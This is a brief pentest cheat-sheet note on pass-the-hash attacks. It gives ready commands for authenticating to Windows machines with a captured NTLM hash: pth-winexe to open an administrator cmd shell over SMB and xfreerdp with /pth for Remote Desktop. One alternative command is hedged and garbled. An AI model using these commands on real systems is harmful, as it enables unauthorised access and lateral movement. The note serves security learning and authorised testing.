# Pass the hash - reusing hashes

Pass the hash (PTH) is a technique that lets the user authenticate by using a valid username and the hash, instead of the unhashed password. So if you have gotten a hold of a hash you might be able to use that hash against another system.

Pass the hash is a suite of different tools. 

## SMB

So in order to use pass the hash we first need to put the hash in a env variable using the export command:

So we will atuhenticate against a smb-service. 

```
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
```
```
pth-winexe -U administrator //192.168.1.101 cmd
```
I think you can run it like this too:

```
pth-winexe -U admin/hash:has //192.168.0.101 cmd
```

## Remote Desktop


``` 
apt-get update
apt-get install freerdp-x11
```

```
xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101
```

https://www.kali.org/penetration-testing/passing-hash-remote-desktop/